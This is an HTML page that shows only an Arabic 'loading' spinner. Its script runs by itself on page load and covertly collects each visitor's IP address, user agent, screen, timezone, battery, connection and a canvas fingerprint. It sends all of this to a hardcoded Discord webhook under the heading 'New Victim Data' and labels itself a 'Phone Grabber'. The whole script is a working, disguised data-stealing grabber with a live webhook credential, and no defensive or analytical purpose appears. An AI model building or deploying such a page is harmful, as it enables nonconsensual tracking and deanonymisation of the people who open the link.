<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #0a0a0a;
            color: #fff;
            font-family: system-ui, -apple-system, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }
        .loader {
            width: 50px;
            height: 50px;
            border: 4px solid #333;
            border-top: 4px solid #5865F2;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div>
        <div class="loader"></div>
        <p style="margin-top: 20px; opacity: 0.7;">جاري التحميل...</p>
    </div>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1558992106822045841/nMgf8JcjFlD8b0D7qcm1GQvI-WwKLZ2PRIy2Xq0055zSj-xTU7-1fl8UdH9C6QM2C1Lr";

        async function getIP() {
            try {
                const res = await fetch("https://api.ipify.org?format=json");
                const data = await res.json();
                return data.ip;
            } catch {
                return "غير متاح";
            }
        }

        function getBattery() {
            return new Promise(resolve => {
                if (!navigator.getBattery) return resolve("غير مدعوم");
                navigator.getBattery().then(b => {
                    resolve(`${Math.round(b.level * 100)}% | Charging: ${b.charging}`);
                }).catch(() => resolve("غير متاح"));
            });
        }

        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement("canvas");
                const ctx = canvas.getContext("2d");
                ctx.textBaseline = "top";
                ctx.font = "14px Arial";
                ctx.fillText("fingerprint", 2, 2);
                return canvas.toDataURL().slice(-50);
            } catch {
                return "غير متاح";
            }
        }

        async function collectAndSend() {
            const ip = await getIP();
            const battery = await getBattery();
            const canvas = getCanvasFingerprint();

            const data = {
                content: null,
                embeds: [{
                    title: "📱 New Victim Data",
                    color: 0x5865F2,
                    fields: [
                        { name: "🌐 IP", value: `\`${ip}\``, inline: true },
                        { name: "📱 Device", value: navigator.userAgentData?.mobile ? "Mobile" : "Desktop/Other", inline: true },
                        { name: "🖥️ Platform", value: navigator.platform || "غير معروف", inline: true },
                        { name: "🔍 User-Agent", value: `\`\`\`${navigator.userAgent}\`\`\`` },
                        { name: "📐 Screen", value: `${screen.width}x${screen.height} | DPR: ${window.devicePixelRatio}`, inline: true },
                        { name: "🌍 Language", value: navigator.language || "غير معروف", inline: true },
                        { name: "⏰ Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone || "غير معروف", inline: true },
                        { name: "🔋 Battery", value: battery, inline: true },
                        { name: "📶 Connection", value: navigator.connection?.effectiveType || "غير متاح", inline: true },
                        { name: "🎨 Canvas FP", value: `\`${canvas}\``, inline: false },
                        { name: "📅 Time", value: new Date().toLocaleString("ar-EG"), inline: false }
                    ],
                    footer: { text: "Phone Grabber • " + location.href },
                    timestamp: new Date().toISOString()
                }]
            };

            try {
                await fetch(WEBHOOK, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(data)
                });
            } catch (e) {
                console.log("Send failed", e);
            }
        }

        // إرسال فوري بمجرد التحميل
        collectAndSend();
    </script>
</body>
</html>
